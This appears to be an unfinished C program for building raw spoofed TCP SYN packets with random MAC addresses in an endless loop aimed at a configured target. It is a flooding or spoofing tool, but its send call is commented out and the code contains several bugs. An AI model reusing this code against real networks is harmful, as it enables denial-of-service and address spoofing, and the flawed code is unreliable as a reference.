#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>]
#include <time.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>

//this code was heavily influenced by the one of Mike Clement in
//http://hacked10bits.blogspot.com/2011/12/sending-raw-ethernet-frames-in-6-easy.html
//Thanks Mike :)

#include "header.h"

#define SRC_IP  "129.104.97.83" //set your source ip here. It can be a fake one
#define SRC_PORT 54321 //set the source port here. It can be a fake one
#define DEST_IP "192.168.1.121" //set your destination ip here
#define DEST_PORT 8081  //set the destination port here
#define TEST_STRING "syn" //a test string as packet payload
#define PCKT_SIZE 8000

int data_size;

char* random_mac_adress(){
    int i, tp;
    int j=0;
    srand(time(NULL));
    char mac[20];
    for (i = 0; i < 6; i++) {
        tp = rand() % 256;
        j=j+sprintf(mac+j,"%s%X%s", tp < 16 ? "0" : "", tp, i < 5 ? ":" : "\n");
    }
    uint8_t* mac_addr=malloc(6);
    if (sscanf(mac, "%x:%x:%x:%x:%x:%x",
            mac_addr,
            mac_addr+1,
            mac_addr+2,
            mac_addr+3,
            mac_addr+4,
            mac_addr+5)<6)
    {
        fprintf(stderr, "could not parse %s\n", mac);
    }
    return mac_addr;
}


void fill_tcph(struct tcphdr* tcph){
    tcph->source=htons(SRC_PORT);
    tcph->dest=htons(DEST_PORT);
    tcph->seq=htonl(4242); //random
    tcph->ack_seq=htonl(4242); //also random
    tcph->doff=5;
    tcph->syn=1;
    tcph->window=htons(PCKT_SIZE);
    tcph->urg_ptr=htons(4242); //nothing urgent
        
}

void fill_iph(struct iphdr* iph){
	iph->version=4;
	iph->tos=0;
	iph->ihl=5;
	iph->tot_len=htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_size);
	iph->id=htons(1);    
	iph->frag_off= htons(0);
	iph->ttl=100;
	iph->protocol=IPPROTO_TCP;
	inet_pton(AF_INET,SRC_IP,&(iph->saddr));
	inet_pton(AF_INET,DEST_IP,&(iph->daddr));
	iph->check=htons(checksum((char*) iph,iph->tot_len));
	iph->check=0;
}

int main(){
    unsigned short proto =0x0800;
    int fd = socket(AF_PACKET, SOCK_RAW,htons(proto));
	srand(time(NULL));
	char* src_ip=malloc(100);
	strcpy(src_ip,SRC_IP);
    int hincl = 1;               

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	char packet[PCKT_SIZE], *data;
	char data_string[] = TEST_STRING;
	memset(packet, 0, PCKT_SIZE);

    //Ethernet header
    struct ethhdr* eth = (struct ethhdr*) packet;

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)(packet+sizeof(struct ethhdr));

	//UDP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(iph + sizeof(struct iphdr));
	

	struct pseudo_udp_header psh; //pseudo header
	

	//data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

	//fill the data section
	strncpy(data, data_string, strlen(data_string));
	data_size=strlen(data);
	fill_iph(iph);
	fill_tcph(tcph);

    //fill pseudo header
    psh.source_address=iph->saddr;
	psh.dest_address=iph->daddr;
	psh.placeholder=0;
	psh.protocol=iph->protocol;
	psh.udp_length=htons(tcph->doff);


    int psize = sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + strlen(data);
	void* pseudogram = malloc(psize);
	memset(pseudogram,0,psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_udp_header));
	memcpy(pseudogram + sizeof(struct pseudo_udp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
	tcph->check = checksum((unsigned short *) pseudogram,psize);
	free(pseudogram);

    while(1){
	memcpy(eth->h_dest,random_mac_adress(),6);
    memcpy(eth->h_source,random_mac_adress(),6);
    eth->h_proto=htons(proto);
    struct sockaddr_ll saddrll;
    memset((void*)&saddrll, 0, sizeof(saddrll));
    saddrll.sll_family = PF_PACKET;   
    saddrll.sll_ifindex = 2;
    saddrll.sll_halen = ETH_ALEN;
    memcpy((void*)(saddrll.sll_addr), eth->h_dest, ETH_ALEN);
    //sendto(fd,packet,ntohs(iph->tot_len)+sizeof(struct  ethhdr),0,&saddrll,sizeof(saddrll));
	perror("");
	}
	return 0;

}